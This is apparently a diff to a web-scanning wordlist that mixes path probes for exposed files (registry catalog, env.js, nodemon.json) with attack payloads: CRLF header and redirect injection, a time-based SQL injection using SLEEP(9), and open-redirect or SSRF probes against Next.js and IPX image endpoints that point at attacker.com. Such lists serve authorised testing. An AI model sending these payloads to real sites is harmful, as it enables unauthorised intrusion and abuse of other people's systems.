@@ -1,5 +1,6 @@
 %0d%0aSet-Cookie:test=test;domain=.test;
 %0dSet-Cookie:test=test;domain=.test;
+%3f%0d%0aLocation:%20http://example.com
 v2/_catalog
 manifest.plist
 config?public=true
@@ -8,8 +9,7 @@ user/group?public=true
 nodemon.json
 assets/env.js
 sitemap.xml?offset=1;SELECT IF((8303>8302),SLEEP(9),2356)#
-_next/image?url=/\/\google.com
-?next=https://google.com
+_next/image?url=/\/\google.com/&w=128&h=128&q=100
 _ipx/w_200/https:%2f%2fexample.com%5c@attacker.com%2fattack.svg
 .well-known/apple-app-site-association
 .well-known/openpgpkey 
